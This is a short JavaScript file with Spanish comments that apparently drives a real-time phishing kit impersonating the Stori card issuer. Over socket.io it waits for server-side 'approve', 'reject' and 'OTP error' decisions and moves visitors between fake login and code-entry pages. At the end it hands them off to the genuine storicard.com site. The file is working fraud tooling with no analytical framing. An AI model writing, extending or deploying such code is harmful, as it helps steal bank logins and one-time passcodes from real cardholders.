const socket = io();
const sessionId = localStorage.getItem("sessionId");

// Al reconectar, asegura que el servidor sepa quién es
socket.emit("reconectar", sessionId);

// Escucha la respuesta general de acceso desde index.html
socket.on("respuesta", (decision) => {
  if (decision === "aprobado") {
    window.location.href = "bienvenido.html";
  } else if (decision === "rechazado") {
    window.location.href = "errorlogo.html";
  }
});

// Escucha la respuesta del código enviado desde bienvenido.html
socket.on("respuestaCodigo", (decision) => {
  if (decision === "error") {
    window.location.href = "denegado.html";
  } else if (decision === "finalizar") {
    window.location.href = "https://www.storicard.com/";
  }
});

// Escucha la respuesta del OTP reingresado desde denegado.html
socket.on("respuestaOtp", (decision) => {
  if (decision === "otp_error") {
    window.location.href = "denegado.html";
  } else if (decision === "finalizar") {
    window.location.href = "https://www.storicard.com/";
  }
});

// Escucha la respuesta del formulario reenviado desde errorlogo.html
socket.on("respuestaErrorLogo", (decision) => {
  if (decision === "otp") {
    window.location.href = "bienvenido.html";
  } else if (decision === "error_logo") {
    window.location.href = "errorlogo.html";
  }
});
